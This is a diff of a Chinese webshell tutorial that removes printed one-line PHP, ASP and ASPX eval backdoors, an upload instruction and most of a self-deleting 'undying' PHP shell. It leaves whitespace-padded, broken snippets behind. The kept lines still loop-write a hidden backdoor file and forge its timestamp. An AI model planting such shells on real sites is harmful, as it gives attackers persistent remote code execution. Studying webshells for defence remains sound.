@@ -1573,18 +1573,7 @@ zip://中只能传入绝对路径。
 <font style="color:rgb(77, 77, 77);">常见的一句话木马：</font>
 
 ```plain
-php的一句话木马： <?php @eval($_POST['pass']);  
-asp的一句话是：   <%eval request ("pass")%>
-aspx的一句话是：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
-```
-
-<font style="color:rgb(77, 77, 77);">我们可以直接将这些语句插入到网站上的某个asp/aspx/php文件上，或者直接创建一个新的文件，在里面写入这些语句，然后把文件上传到网站上即可。</font>
-
-#### <font style="color:rgb(79, 79, 79);">基本原理：</font>
-<font style="color:rgb(77, 77, 77);">首先我们先看一个原始而又简单的php一句话木马：</font>
-
-```plain
-   <?php @eval($_POST['cmd']); ?>
+php的一句话木马： <?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ?>
 ```
 
 <font style="color:rgb(77, 77, 77);">这是php的一句话后门中最普遍的一种。它的工作原理是：</font>  
@@ -1706,15 +1695,7 @@ substr_replace(string,replacement,start,length)
 ##### <font style="color:rgb(77, 77, 77);">八、不死马</font>
 ```php
 <?php
-	ignore_user_abort(true);  //设置与客户机断开是否会终止脚本的执行，true则不会
-	set_time_limit(0);  //如果为零说明永久执行直到程序结束
-	unlink(__FILE__);  //调用unlink()的时候，文件还是存在的，只是目录里找不到该文件了，但是已经打开这个文件的进程可以正常读写
-	$file='./.index1.php';
-	$code='<?php
-		if(md5($_POST["pass"])=="xxxxxxxxxx")  //给木马设置密码，防止他人使用
-		{
-			@eval($_POST["cmd"]);
-		}?>';  
+	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ?>';  
 	while(1){
 		file_put_contents($file,$code);
 		system('touch -m -d "2018-12-01 9:10:12" .index1.php');  //设置文件的编辑时间
